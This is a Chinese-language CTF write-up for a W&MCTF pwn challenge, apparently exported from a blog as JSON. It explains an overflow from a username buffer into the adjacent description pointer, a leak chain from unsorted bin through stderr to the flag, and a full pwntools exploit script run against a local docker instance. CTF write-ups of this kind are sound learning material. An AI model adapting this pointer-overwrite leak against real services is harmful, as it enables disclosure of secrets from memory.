[{"content":" 题目分析 竟然给了源码0.0，直接开看！！！\nflag以全局变量存在bss段中\nchecksec一下果然开了PIE\u0026hellip;\u0026hellip;.\n继续看源码，建立了一个结构体，并将成员分别输出\n结构体如下\n1 2 3 4 typedef struct { char username[32]; char *description; } User; 漏洞点在于第一个read语句，对username的读入会覆盖掉description，可以打开pwndbg看结构体在内存上的分布\nusername占0x20，却可以读入0x28个字节，将0x55555555c5f0（description）给覆盖，之后在将description给输出时，有一个任意内存泄露\n想到这，我们就可以通过泄露的方式将flag给读出\n漏洞利用 由于开了PIE，低三位是不变的，先看看flag的地址\n第三位是0X0C0，由于没有内存直接指向flag，先看看周围的内存空间，发现flag上面有std_err\n一般libc中都会有内存指向std_err，所以在libc中搜索一下，果然发现了\n由于libc中偏移是固定的，所以现在只需要泄露个libc地址就ok了，在堆附近可以看到有一个unsorted bin，泄露出它的fd就行了\n总结，我们的leak路线就是unsorted_bin.fd\u0026mdash;\u0026ndash;\u0026gt; stderr\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;flag\n泄露FD上的libc是1/16的几率爆破\n由于远程偏移不一样，我们开一个docker容器将里面的libc和ld给拿出来\n1 sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .) 之后就是让人崩溃的偏移调试。。。。最终偏移是通过泄露出了附近的地址手动确定的\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context(os = \u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;,log_level = \u0026#39;debug\u0026#39;,timeout=0.5) binary_path = \u0026#39;./leakleakleak\u0026#39; libc_path = \u0026#39;./libc.so.6\u0026#39; elf = ELF(binary_path) #leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) #main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 def debug(): gdb.attach(p) pause() #\u0026#34;0x7fe8c7a74848\u0026#34; while(True): try: p = remote(\u0026#34;127.0.0.1\u0026#34;, 5000) p.recvuntil(b\u0026#39;What is your name? \u0026#39;) payload = b\u0026#39;a\u0026#39;*32+b\u0026#39;\\x10\\xa7\u0026#39; #debug() p.send(payload) p.recvuntil(b\u0026#39;Let me tell you something about yourself! :3\\n\u0026#39;) addr = u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;)) log.success(\u0026#34;libc---\u0026gt;\u0026#34; + hex(addr)) std_err = addr - 0xe38 p.recvuntil(b\u0026#39;Continue? (Y/n) \u0026#39;) p.sendline(b\u0026#39;Y\u0026#39;) #second p.recvuntil(b\u0026#39;What is your name? \u0026#39;) payload = b\u0026#39;a\u0026#39;*32+p64(std_err) p.send(payload) p.recvuntil(b\u0026#39;Let me tell you something about yourself! :3\\n\u0026#39;) flag_addr = u64(p.recvuntil(b\u0026#39;\\n\u0026#39;,drop=True).ljust(8,b\u0026#39;\\x00\u0026#39;)) + 0x20 log.success(\u0026#34;flag_addr---\u0026gt;\u0026#34;+hex(flag_addr)) p.recvuntil(b\u0026#39;Continue? (Y/n) \u0026#39;) p.sendline(b\u0026#39;Y\u0026#39;) #third log.success(\u0026#34;libc---\u0026gt;\u0026#34; + hex(addr)) log.success(\u0026#34;stderr--\u0026gt;\u0026#34; + hex(std_err)) log.success(\u0026#34;flag_addr---\u0026gt;\u0026#34;+hex(flag_addr)) p.recvuntil(b\u0026#39;What is your name? \u0026#39;) p.send(payload) payload = b\u0026#39;a\u0026#39;*32+p64(flag_addr) p.send(payload) p.interactive() except: p.close() ","permalink":"http://localhost:1313/posts/writeups/wmctf/","summary":"题目分析 竟然给了源码0.0，直接开看！！！\nflag以全局变量存在bss段中\nchecksec一下果然开了PIE\u0026hellip;\u0026hellip;.\n继续看源码，建立了一个结构体，并将成员分别输出\n结构体如下\n1 2 3 4 typedef struct { char username[32]; char *description; } User; 漏洞点在于第一个read语句，对username的读入会覆盖掉description，可以打开pwndbg看结构体在内存上的分布\nusername占0x20，却可以读入0x28个字节，将0x55555555c5f0（description）给覆盖，之后在将description给输出时，有一个任意内存泄露\n想到这，我们就可以通过泄露的方式将flag给读出\n漏洞利用 由于开了PIE，低三位是不变的，先看看flag的地址\n第三位是0X0C0，由于没有内存直接指向flag，先看看周围的内存空间，发现flag上面有std_err\n一般libc中都会有内存指向std_err，所以在libc中搜索一下，果然发现了\n由于libc中偏移是固定的，所以现在只需要泄露个libc地址就ok了，在堆附近可以看到有一个unsorted bin，泄露出它的fd就行了\n总结，我们的leak路线就是unsorted_bin.fd\u0026mdash;\u0026ndash;\u0026gt; stderr\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;flag\n泄露FD上的libc是1/16的几率爆破\n由于远程偏移不一样，我们开一个docker容器将里面的libc和ld给拿出来\n1 sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .) 之后就是让人崩溃的偏移调试。。。。最终偏移是通过泄露出了附近的地址手动确定的\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context(os = \u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;,log_level = \u0026#39;debug\u0026#39;,timeout=0.","title":"W\u0026MCTF pwn writeups"}]